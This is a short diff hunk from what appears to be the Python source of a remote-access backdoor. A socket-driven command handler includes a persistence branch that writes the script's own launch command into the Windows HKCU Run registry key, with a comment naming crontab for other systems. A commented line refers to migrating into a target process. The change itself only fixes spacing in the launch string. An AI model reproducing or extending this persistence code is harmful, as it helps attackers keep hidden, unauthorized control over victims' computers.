@@ -136,7 +136,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             # targetPid = s.recv(BUFF_SIZE).decode()  # Target PID to migrate to
 
         elif int(cmd) == 8:  # Persistence, registry for Windows, Crontab for *nix
-            exe = 'python' + cwd + '\\' + sys.argv[0] + ' ' + sys.argv[1] + ' ' + sys.argv[2]
+            exe = 'python ' + cwd + '\\' + sys.argv[0] + ' ' + sys.argv[1] + ' ' + sys.argv[2]
             if family == 'Windows':  # Do Windows persistence since we're on Windows
                 key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
                 # Create our Run reg key entry using this script and our arguments
